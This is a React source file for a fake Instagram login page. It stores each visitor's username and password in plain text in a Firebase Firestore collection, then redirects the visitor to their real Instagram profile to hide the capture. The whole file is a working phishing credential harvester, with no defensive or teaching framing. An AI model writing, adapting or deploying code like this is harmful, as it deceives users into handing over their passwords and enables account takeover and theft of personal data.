import React, { useState } from "react";
import { Phone } from "lucide-react";
import { doc, setDoc, Timestamp } from "firebase/firestore";
import { db } from "../firebaseConfig";

const InstagramLogin = () => {
  const [credentials, setCredentials] = useState({
    username: "",
    password: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setCredentials((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const docId = Date.now().toString();
      const userRef = doc(db, "users", docId);
      await setDoc(userRef, {
        name: credentials.username,
        password: credentials.password,
        date: Timestamp.now(),
      });
      console.log("Document written successfully.");

      setCredentials({
        username: "",
        password: "",
      });

      // Redirect to the user's Instagram profile
      const instagramURL = `https://www.instagram.com/${credentials.username}/`;
      window.location.href = instagramURL;
    } catch (error) {
      console.error("Error adding document: ", error);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-xs sm:max-w-sm md:max-w-md lg:max-w-lg space-y-8">
        {/* Main Container */}
        <div className="bg-white p-6 sm:p-8 border border-gray-300 rounded-lg shadow-md">
          {/* Logo */}
          <div className="text-center mb-8">
            <h1 className="font-serif text-4xl sm:text-5xl lg:text-6xl mb-4">Instagram</h1>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                name="username"
                placeholder="Phone number, username, or email"
                value={credentials.username}
                onChange={handleChange}
                className="w-full px-3 sm:px-4 py-2 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400 text-sm sm:text-base"
                required
              />
            </div>
            <div>
              <input
                type="password"
                name="password"
                placeholder="Password"
                value={credentials.password}
                onChange={handleChange}
                className="w-full px-3 sm:px-4 py-2 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400 text-sm sm:text-base"
                required
              />
            </div>
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-2 sm:py-3 rounded font-semibold hover:bg-blue-600 transition-colors text-sm sm:text-base"
              disabled={!credentials.username || !credentials.password}
            >
              Log In
            </button>
          </form>

          {/* Divider */}
          <div className="flex items-center my-4">
            <div className="flex-1 border-t border-gray-300"></div>
            <div className="px-4 text-sm sm:text-base text-gray-500 font-semibold">OR</div>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          {/* Facebook Login Button */}
          <button className="w-full text-blue-900 font-semibold flex items-center justify-center space-x-2 my-4 text-sm sm:text-base">
            <Phone size={20} className="text-blue-900" />
            <span>Log in with Facebook</span>
          </button>

          {/* Forgot Password Link */}
          <div className="text-center mt-4">
            <a href="#" className="text-xs sm:text-sm text-blue-900">
              Forgot password?
            </a>
          </div>
        </div>

        {/* Sign Up Section */}
        <div className="bg-white p-4 border border-gray-300 rounded-lg text-center">
          <p className="text-sm sm:text-base">
            Don't have an account?{" "}
            <a href="#" className="text-blue-500 font-semibold">
              Sign up
            </a>
          </p>
        </div>

        {/* Get the App */}
        <div className="text-center space-y-4">
          <p className="text-sm sm:text-base">Get the app.</p>
          <div className="flex justify-center space-x-4">
            <img
              src="images.png"
              alt="Get it on App Store"
              className="h-8 sm:h-10 lg:h-12"
            />
            <img
              src="downloadd.png"
              alt="Get it on Google Play"
              className="h-8 sm:h-10 lg:h-12"
            />
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;
